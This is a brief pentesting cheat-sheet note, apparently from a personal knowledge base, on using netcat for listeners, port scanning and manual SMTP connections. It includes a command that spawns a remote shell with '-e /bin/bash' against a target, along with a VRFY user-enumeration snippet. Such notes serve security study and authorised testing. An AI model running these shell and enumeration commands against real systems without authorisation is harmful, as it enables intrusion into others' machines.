**Tags:** #type/tool #tactic/command-and-control  #todo
**Link:** 
**Purpose:** simple tool for connect shell and listeners

---
# Info
simple tool to setup shell listeners and connect to shell
windows executables: https://github.com/int0x33/nc.exe/
more sophisticated alternative: [[3 Tools/shells/Socat]]

# Usage
start listener:
`nc -lnvp <port>
connect to machine:
`nc <target-ip> <chosen-port>`
start bind shell running bash:
`nc -nv <target-ip> <chosen-port> -e /bin/bash`

can also be used for **port scanning**:
- TCP Scan: `nc -nvv -w 1 -z [IP] [START_PORT-END_PORT]`
	- eg. `nc -nvv -w 1 -z 192.168.50.152 3388-3390`
	- `-z` = zero io mode
- UDP Scan: same as tcp scan, use `-u` additionally
	- if filtered, ports will be listed as open because no "ICMP port unreachable" is received 
# Snippets
### Manual SMTP Connection
connect to port 25, send [[2 Tech-Specifics/Network/Protocols/TCP 25 SMTP|SMTP]] commands manually

``` shell
nc -nv 192.168.50.8 25
VRFY root
```

